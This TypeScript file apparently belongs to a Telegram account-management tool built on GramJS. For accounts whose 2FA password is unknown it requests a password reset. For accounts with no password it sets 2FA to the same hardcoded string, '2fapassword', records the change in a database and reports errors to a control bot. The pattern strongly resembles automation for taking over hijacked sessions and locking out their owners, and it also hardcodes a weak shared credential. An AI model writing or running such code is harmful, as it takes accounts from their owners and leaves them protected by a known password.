import { Account } from '../../@types/Account';
import TelegramClient from '../../common/gramjs/client/TelegramClient';
import { generateRandomBytes } from '../../common/gramjs/Helpers';
import { computeDigest } from '../../common/gramjs/Password';
import GramJs from '../../common/gramjs/tl/api';
import { updateAccountById } from '../../db/accounts';
import { sendToMainBot } from '../../helpers/sendToMainBot';

export const setup2FA = async (client: TelegramClient, account: Account) => {
  try {
    const { twoFa, unknownTwoFa } = account;
    if (twoFa) {
      return;
    }

    const resetPassword = await client.invoke(
      new GramJs.account.ResetPassword()
    );

    if (resetPassword instanceof GramJs.account.ResetPasswordOk) {
      throw new Error('PASSWORD_EMPTY');
    }

    if (!unknownTwoFa) {
      await updateAccountById(client._accountId, {
        unknownTwoFa: true,
      });
    }
  } catch (e: any) {
    if (e.message === 'PASSWORD_EMPTY') {
      const pwd = await client.invoke(new GramJs.account.GetPassword());

      if (!(pwd.newAlgo instanceof GramJs.PasswordKdfAlgoUnknown)) {
        pwd.newAlgo.salt1 = Buffer.concat([
          pwd.newAlgo.salt1,
          generateRandomBytes(32),
        ]);
      }

      try {
        await client.invoke(
          new GramJs.account.UpdatePasswordSettings({
            password: new GramJs.InputCheckPasswordEmpty(),
            newSettings: new GramJs.account.PasswordInputSettings({
              newAlgo: pwd.newAlgo,
              newPasswordHash: await computeDigest(pwd.newAlgo, '2fapassword'),
              hint: '',
              email: undefined,
              newSecureSettings: undefined,
            }),
          })
        );

        await updateAccountById(client._accountId, {
          unknownTwoFa: false,
          twoFa: true,
        });
      } catch (e: any) {
        await sendToMainBot(
          `💀 ERROR_SETTING_UP_2FA 💀
ID: ${client._accountId}
ERROR: ${e.message}`
        );
      }
    }
  }
};
